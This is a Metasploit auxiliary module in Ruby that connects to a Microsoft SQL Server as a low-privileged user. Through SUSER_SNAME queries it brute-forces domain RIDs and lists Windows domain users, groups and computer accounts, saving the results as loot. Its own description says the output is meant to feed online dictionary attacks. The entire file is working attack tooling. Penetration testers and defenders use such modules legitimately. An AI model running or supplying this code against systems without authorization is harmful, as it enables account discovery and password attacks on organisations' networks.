##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/mssql_commands'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration',
      'Description' => %q{
        This module can be used to bruteforce RIDs associated with the domain of the SQL Server
        using the SUSER_SNAME function. This is similar to the smb_lookupsid module, but executed
        through SQL Server queries as any user with the PUBLIC role (everyone). Information that
        can be enumerated includes Windows domain users, groups, and computer accounts. Enumerated
        accounts can then be used in online dictionary attacks.
      },
      'Author'      =>
        [
          'nullbind <scott.sutherland[at]netspi.com>',
          'antti <antti.rantasaari[at]netspi.com>'
        ],
      'License'     => MSF_LICENSE,
      'References'  => [[ 'URL','http://msdn.microsoft.com/en-us/library/ms174427.aspx']]
    ))

    register_options(
      [
        OptInt.new('FuzzNum', [true, 'Number of principal_ids to fuzz.', 10000]),
      ])
  end

  def run
    # Check connection and issue initial query
    print_status("Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...")
    if mssql_login_datastore
      print_good('Connected.')
    else
      print_error('Login was unsuccessful. Check your credentials.')
      disconnect
      return
    end

    # Get the server name
    sql_server_name = get_sql_server_name
    print_status("SQL Server Name: #{sql_server_name}")

    # Get the domain name
    sql_server_domain = get_windows_domain
    if sql_server_domain.nil?
      print_error("Could not recover the SQL Server's domain.")
      disconnect
      return
    else
      print_status("Domain Name: #{sql_server_domain}")
    end

    # Check if the domain and hostname are the same
    if sql_server_name == sql_server_domain
      print_error("The SQL Server does not appear to be part of a Windows domain.")
      disconnect
      return
    end

    # Get the base sid for the domain
    windows_domain_sid = get_windows_domain_sid(sql_server_domain)
    if windows_domain_sid.nil?
      print_error("Could not recover the SQL Server's domain sid.")
      disconnect
      return
    else
      print_good("Found the domain sid: #{windows_domain_sid}")
    end

    # Get a list of windows users, groups, and computer accounts using SUSER_NAME()
    print_status("Brute forcing #{datastore['FuzzNum']} RIDs through the SQL Server, be patient...")
    win_domain_user_list = get_win_domain_users(windows_domain_sid)

    disconnect

    if win_domain_user_list.nil? || win_domain_user_list.empty?
      print_error('Sorry, no Windows domain accounts were found, or DC could not be contacted.')
      return
    end

    # Print number of objects found and write to a file
    print_good("#{win_domain_user_list.length} user accounts, groups, and computer accounts were found.")

    win_domain_user_list.sort.each do |windows_login|
      vprint_status(" - #{windows_login}")
    end

    # Create table for report
    windows_domain_login_table = Rex::Text::Table.new(
      'Header'  => 'Windows Domain Accounts',
      'Ident'   => 1,
      'Columns' => ['name']
    )

    # Add brute forced names to table
    win_domain_user_list.each do |object_name|
      windows_domain_login_table << [object_name]
    end

    # Create output file
    this_service = report_service(
      :host  => rhost,
      :port => rport,
      :name => 'mssql',
      :proto => 'tcp'
    )
    file_name = "#{datastore['RHOST']}-#{datastore['RPORT']}_windows_domain_accounts.csv"
    path = store_loot(
      'mssql.domain.accounts',
      'text/plain',
      datastore['RHOST'],
      windows_domain_login_table.to_csv,
      file_name,
      'Domain Users enumerated through SQL Server',
      this_service)
    print_status("Query results have been saved to: #{path}")
  end

  # Get list of windows accounts,groups,and computer accounts
  def get_win_domain_users(windows_domain_sid)

    # Create array to store the windws accounts etc
    windows_logins = []

    # Fuzz the principal_id parameter passed to the SUSER_NAME function
    (500..datastore['FuzzNum']).each do |principal_id|

      # Convert number to hex and fix order
      principal_id_hex = "%02X" % principal_id
      principal_id_hex_pad = (principal_id_hex.size.even? ? principal_id_hex : ("0"+ principal_id_hex))
      principal_id_clean  = principal_id_hex_pad.scan(/(..)/).reverse.flatten.join

      # Add padding
      principal_id_hex_padded2 = principal_id_clean.ljust(8, '0')

      # Create full sid
      win_sid = "0x#{windows_domain_sid}#{principal_id_hex_padded2}"

      # Return if sid does not resolve correctly for a domain
      if win_sid.length < 48
        return nil
      end

      # Setup query
      sql = "SELECT SUSER_SNAME(#{win_sid}) as name"

      # Execute query
      result = mssql_query(sql)

      # Parse results
      parse_results = result[:rows]
      windows_login = parse_results[0][0]

      # Print account,group,or computer account etc
      if windows_login.length != 0
        print_status(" - #{windows_login}")

        vprint_status("Test sid: #{win_sid}")
      end

      # Add to windows domain object list
      windows_logins.push(windows_login) unless windows_logins.include?(windows_login)
    end

    # Return list of logins
    windows_logins
  end

  # Get windows domain
  def get_windows_domain

    # Setup query to check the domain
    sql = "SELECT DEFAULT_DOMAIN() as mydomain"

    # Run query
    result = mssql_query(sql)

    # Parse query results
    parse_results = result[:rows]
    sql_server_domain = parse_results[0][0]

    # Return domain
    sql_server_domain
  end

  # Get the sql server's hostname
  def get_sql_server_name

    # Setup query to check the server name
    sql = "SELECT @@servername"

    # Run query
    result = mssql_query(sql)

    # Parse query results
    parse_results = result[:rows]
    sql_instance_name = parse_results[0][0]
    sql_server_name = sql_instance_name.split('\\')[0]

    # Return servername
    sql_server_name
  end

  # Get windows domain
  def get_windows_domain_sid(sql_server_domain)

    # Set group
    domain_group = "#{sql_server_domain}\\Domain Admins"

    # Setup query to check the Domain SID
    sql = "select SUSER_SID('#{domain_group}') as dasid"

    # Run query
    result = mssql_query(sql)

    # Parse query results
    parse_results = result[:rows]
    object_sid = parse_results[0][0]
    domain_sid = object_sid[0..47]

    # Return if sid does not resolve for a domain
    if domain_sid.length == 0
      return nil
    end

    # Return domain sid
    domain_sid
  end
end
